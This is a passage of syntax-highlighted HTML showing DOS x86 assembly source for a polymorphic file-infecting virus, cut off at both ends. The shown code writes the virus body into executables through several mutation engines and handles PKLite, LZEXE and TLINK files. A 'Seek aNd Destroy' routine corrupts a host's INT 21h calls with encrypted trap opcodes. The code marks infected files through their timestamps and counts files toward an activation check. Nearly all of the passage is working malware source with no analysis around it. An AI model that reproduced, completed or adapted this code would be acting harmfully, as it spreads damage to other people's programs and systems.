        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">res_engine</span><span class="sc0">      </span><span class="sc1">; Call engine</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">MME_DEC</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ssrme_engine</span><span class="sc0">    </span><span class="sc1">; Call engine</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mme_engine</span><span class="sc0">      </span><span class="sc1">; Call engine</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Write virus body to disk</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">check_pkexe_snd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">

</span><span class="sc5">check_pkexe_snd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">pklite_exe</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; PKLited EXE file?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">check_pkcom_snd</span><span class="sc0">         </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">set_infection_mark</span><span class="sc0">

</span><span class="sc5">check_pkcom_snd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">pklite_com</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; PKLited COM file?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">check_tlink_snd</span><span class="sc0">         </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">set_infection_mark</span><span class="sc0">

</span><span class="sc5">check_tlink_snd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">word_ofs1C</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; Linked with Borland TLINK?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">check_lzexe_snd</span><span class="sc0">         </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">set_infection_mark</span><span class="sc0">

</span><span class="sc5">check_lzexe_snd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">word_ofs1C</span><span class="sc4">,</span><span class="sc12">'ZL'</span><span class="sc0">         </span><span class="sc1">; LZEXE file?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">jmp_SND</span><span class="sc0">                 </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">set_infection_mark</span><span class="sc0">

</span><span class="sc5">jmp_SND</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">SND</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Seek aNd Destroy Technology [SND]'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">SND</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Lseek start</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0BA00h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; DS:=0BA00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Read 16KB from file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; CX:=number of bytes read</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">l_next_SND</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0B8h</span><span class="sc0">      </span><span class="sc1">; MOV AX,xxxx?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">cmp_movax_int21h</span><span class="sc0">        </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0B4h</span><span class="sc0">      </span><span class="sc1">; MOV AH,xx?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next_SND</span><span class="sc0">                </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">21CDh</span><span class="sc0">   </span><span class="sc1">; INT 21h?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next_SND</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">                             </span><span class="sc1">; Found MOV AH,xx + INT 21h</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Get xx in MOV AH,xx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0F0h</span><span class="sc0">      </span><span class="sc1">; Int 6h when executed</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                    </span><span class="sc1">; AX in [0..7]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">SND_table</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">; Gen instruction</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                   </span><span class="sc1">; Encrypt original byte</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">; and store it</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">next_SND</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

</span><span class="sc5">cmp_movax_int21h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">21CDh</span><span class="sc0">   </span><span class="sc1">; INT 21h?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next_SND</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; xxxx in MOV AX,xxxx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0F0h</span><span class="sc0">      </span><span class="sc1">; Int 6h when executed</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                    </span><span class="sc1">; AX in [0..7]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">SND_table</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                      </span><span class="sc1">; AL -&gt; AX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">; Generate opcode</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">; Random number</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; Encrypt original word</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; and store it</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">next_SND</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l_next_SND</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">        </span><span class="sc1">; Lseek start</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Write code</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">set_infection_mark</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

</span><span class="sc5">get_random</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">   
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; Get random number</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">53h</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">    
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">SND_table</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3Ch</span><span class="sc0">     </span><span class="sc1">; cmp al,xx (+1 = cmp ax,xxxx)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">24h</span><span class="sc0">     </span><span class="sc1">; and al,xx (+1 = and ax,xxxx)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">14h</span><span class="sc0">     </span><span class="sc1">; adc al,xx (+1 = adx ax,xxxx)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Ch</span><span class="sc0">     </span><span class="sc1">; or  al,xx (+1 = or  ax,xxxx)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">34h</span><span class="sc0">     </span><span class="sc1">; xor al,xx (+1 = xor ax,xxxx)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1Ch</span><span class="sc0">     </span><span class="sc1">; sbb al,xx (+1 = sbb ax,xxxx)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2Ch</span><span class="sc0">     </span><span class="sc1">; sub al,xx (+1 = sub ax,xxxx)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04h</span><span class="sc0">     </span><span class="sc1">; add al,xx (+1 = add ax,xxxx)</span><span class="sc0">

</span><span class="sc5">set_infection_mark</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Get file date/time</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; file time</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">           </span><span class="sc1">; Clear seconds field</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">file_month</span><span class="sc0">   </span><span class="sc1">; Set infection mark (seconds=month)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Set file date/time</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">close_file</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">pklite_exe</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">pklite_com</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_infected</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'- THERE CAN BE ONLY ONE -'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">close_infected</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Close file</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc5">infection_count</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">restore_attr</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Close file</span><span class="sc0">
</span><span class="sc5">restore_attr</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">attributes</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Restore attributes</span><span class="sc0">

</span><span class="sc5">restore_i24</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">ofs_i24</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg_i24</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Restore int 24h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">pklite_exe</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">pklite_com</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Inc number of files processed</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">50</span><span class="sc0">      </span><span class="sc1">; 50 files?</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">check_activation</span><span class="sc0">        </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">popregs_iret</span><span class="sc0">

</span><span class="sc5">check_activation</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">tick_counter</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc2">900</span><span class="sc4">*</span><span class="sc2">18</span><span class="sc0"> </span><span class="sc1">; &gt;=900 seconds? (&gt;15 mins.)</span><span class="sc0">
